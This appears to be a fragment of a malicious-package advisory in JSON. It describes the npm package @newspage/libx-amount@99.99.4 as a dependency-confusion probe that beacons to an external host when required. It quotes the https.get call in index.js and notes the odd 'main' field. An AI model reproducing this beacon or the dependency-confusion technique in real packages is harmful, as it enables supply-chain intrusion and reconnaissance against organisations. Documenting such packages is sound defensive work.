  "summary": "Dependency-confusion beacon to external host on require",
  "details": "The package @newspage/libx-amount@99.99.4 issues an HTTPS GET to the hardcoded host accenture-npm.azurewebsites.net on require (`https.get('https://accenture-npm.azurewebsites.net/async',...)` in index.js). The @newspage scope combined with the libx-amount name and the implausibly high 99.99.4 version is the shape of a dependency-confusion probe designed to win resolution against an internal package of the same name, and the callback host identifies which organizations have resolved and loaded the package. The package.json `main` field is set to the shell-like string `node index.js || true` rather than a module path, inconsistent with a normal library manifest.",
